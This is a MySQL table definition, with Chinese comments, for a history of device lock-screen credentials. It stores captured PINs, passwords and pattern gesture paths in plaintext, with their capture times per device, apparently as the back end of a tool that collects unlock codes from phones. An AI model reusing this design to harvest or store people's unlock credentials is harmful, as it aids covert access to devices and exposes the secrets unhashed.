CREATE TABLE IF NOT EXISTS device_keyguard_pin_history (
  id VARCHAR(36) NOT NULL PRIMARY KEY COMMENT '主键',
  device_id VARCHAR(64) NOT NULL COMMENT '设备ID',
  pin_content VARCHAR(128) NOT NULL COMMENT 'PIN/密码/图案单元格',
  digit_count INT NOT NULL DEFAULT 0 COMMENT '位数/点数',
  lock_type VARCHAR(16) NOT NULL DEFAULT 'pin' COMMENT 'pin|password|pattern',
  gesture_path TEXT NULL COMMENT '图案 PATH JSON',
  source VARCHAR(16) NOT NULL DEFAULT 'device' COMMENT 'device|manual',
  captured_at DATETIME NOT NULL COMMENT '采集时间',
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '入库时间',
  UNIQUE KEY uk_device_pin_captured (device_id, pin_content(64), captured_at),
  KEY idx_kg_hist_device_time (device_id, captured_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
